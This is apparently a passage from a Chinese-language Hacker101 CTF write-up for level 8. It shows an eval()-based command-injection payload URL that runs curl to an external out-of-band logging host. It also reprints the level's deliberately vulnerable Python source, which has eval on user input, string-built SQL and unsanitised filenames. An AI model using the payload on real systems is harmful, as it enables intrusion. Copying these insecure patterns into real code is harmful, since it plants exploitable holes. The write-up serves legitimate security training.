![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1522763213195.png)

### [](#SQL-Injection-2 "SQL Injection")SQL Injection

### [](#Code-Execution "Code Execution")Code Execution

漏洞在下载功能处，命令执行点 download = eval(download）。接收参数 download，但是没有输出，我们可以用服务器接收输出。

即外带式命令执行漏洞。

```
https://levels-b.hacker101.com/level8/view/13151?download=__import__('os').system('curl http://83i93o.ceye.io?from-hacker101')
```

查看 http 请求，发现请求过来了，命令执行成功了。

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1523069644629.png)

### [](#源码-2 "源码")源码

```
from handler import *

@handler('level8/index')
def get_index():
	return dict(docs=db.query('SELECT id, name, mimetype FROM documents WHERE sessid=%s', handler.sessid()))

@handler
def post_index(name, doc):
	fn, mime = doc.filename, doc.mimetype

	doc.save('level8_sandbox/' + fn)

	db.query("INSERT INTO documents (name, filename, mimetype, sessid) VALUES ('%s', '%s', '%s', '%s')" % (name, fn, mime, handler.sessid()))

	redirect(get_index)

inlinable = 'image/jpeg image/png text/plain'.split(' ')

@handler
def get_view(id, download='None'):
	download = eval(download)
	
	(filename, mimetype), = db.query('SELECT filename, mimetype FROM documents WHERE sessid=%s AND id=%s', handler.sessid(), id)

	if download == None and mimetype not in inlinable:
		download = True

	if download:
		handler.header('Content-Disposition', 'attachment; filename=' + filename)

	handler.header('Content-Type', mimetype)

	return file('level8_sandbox/' + filename, 'rb').read()

if not db.hastable('documents'):
	db.maketable('documents', 
		name='VARCHAR(1024)', 
		filename='VARCHAR(1024)', 
		mimetype='VARCHAR(1024)', 
		sessid='CHAR(16)'
	)
```